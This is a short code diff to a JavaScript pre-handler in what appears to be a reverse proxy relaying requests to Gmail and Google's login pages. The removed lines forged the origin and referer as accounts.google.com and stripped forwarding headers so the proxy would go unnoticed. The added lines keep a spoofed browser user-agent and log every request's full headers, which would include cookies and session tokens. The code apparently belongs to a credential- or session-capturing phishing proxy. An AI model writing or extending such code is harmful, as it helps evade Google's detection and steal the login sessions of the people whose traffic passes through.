@@ -119,21 +119,13 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
     }
 
     execute(clientContext) {
-        // Set proper headers for Gmail like working services do
-        this.req.headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36'
-        
-        // Ensure origin and referer point to accounts.google.com for Gmail
-        this.req.headers['origin'] = 'https://accounts.google.com'
-        this.req.headers['referer'] = 'https://accounts.google.com/'
-        
-        // Remove any proxy-specific headers that might confuse Gmail
-        delete this.req.headers['x-forwarded-for']
-        delete this.req.headers['x-forwarded-proto']
-        delete this.req.headers['x-real-ip']
-        
+        // Minimal header modifications - let Gmail handle most of the validation
         console.log('Gmail request URL:', this.req.url)
         console.log('Gmail request method:', this.req.method)
         console.log('Gmail request headers:', this.req.headers)
+        
+        // Only set essential headers
+        this.req.headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36'
         
         // For POST requests, ensure content-type is set correctly
         if (this.req.method === 'POST') {
